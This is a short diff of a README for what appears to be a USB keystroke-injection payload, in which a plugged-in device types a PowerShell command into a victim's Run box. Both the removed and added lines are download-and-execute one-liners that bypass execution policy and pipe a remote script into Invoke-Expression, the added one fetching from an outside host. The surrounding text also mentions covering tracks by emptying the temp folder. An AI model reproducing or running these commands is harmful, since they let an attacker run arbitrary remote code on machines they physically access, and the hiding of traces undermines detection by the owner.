@@ -36,8 +36,9 @@ and lastly to clean up your tracks behind you the tmp folder will be emptied and
 
 * Plug in your device
 * Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
+* Place your images URL in the $url variable
 ```
-powershell -w h -NoP -NonI -Exec Bypass $pl = iwr <URL for your hosted payload>?dl=1; invoke-expression $pl
+powershell -noexit -NoP -NonI -Exec Bypass $url='URL-HERE';iwr jakoby.lol/pkw | iex
 ```
 
 <p align="right">(<a href="#top">back to top</a>)</p>
